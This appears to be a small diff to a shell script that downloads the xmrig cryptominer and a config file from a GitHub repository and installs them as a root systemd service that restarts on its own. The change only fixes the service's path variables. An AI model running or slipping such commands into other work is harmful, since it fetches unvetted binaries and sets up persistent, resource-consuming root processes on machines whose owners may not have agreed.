@@ -1,3 +1,4 @@
+export REAL_PATH=$(pwd) && \
 mkdir -p ~/miner && cd ~/miner && \
 wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig && \
 wget https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json && \
@@ -10,8 +11,8 @@ After=network.target
 [Service]
 Type=simple
 User=root
-WorkingDirectory=$(pwd)
-ExecStart=$(pwd)/xmrig -c $(pwd)/config.json
+WorkingDirectory=$REAL_PATH
+ExecStart=$REAL_PATH/xmrig -c $REAL_PATH/config.json
 Restart=always
 RestartSec=10
 
@@ -20,4 +21,4 @@ WantedBy=multi-user.target
 EOT" && \
 sudo systemctl daemon-reload && \
 sudo systemctl enable miner.service && \
-sudo systemctl start miner.service && \
+sudo systemctl start miner.service
